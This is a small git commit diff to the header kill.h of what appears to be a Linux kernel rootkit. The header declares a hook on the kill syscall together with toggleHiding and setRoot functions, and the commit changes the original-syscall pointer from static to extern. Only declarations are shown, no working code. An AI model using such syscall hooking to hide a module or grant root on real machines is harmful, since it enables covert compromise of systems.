1f33d66c79b6b58cc13b6b6d17caee5be0da927e
Burr <33370725+BlameBurr@users.noreply.github.com>
2022-09-18 19:49:38 +0100

    Update kill.h

--- functions/kill.h
+++ functions/kill.h
@@ -4,9 +4,9 @@ void toggleHiding(void);
 void setRoot(void);
 
 #ifdef PTREGS_SYSCALL_STUBS
-static asmlinkage long (*killOG)(const struct pt_regs *);
+extern asmlinkage long (*killOG)(const struct pt_regs *);
 asmlinkage int killHook(const struct pt_regs *regs);
 #else
-static asmlinkage long (*killOG)(pid_t pid, int sig);
+extern asmlinkage long (*killOG)(pid_t pid, int sig);
 asmlinkage int killHook(pid_t pid, int sig)
 #endif
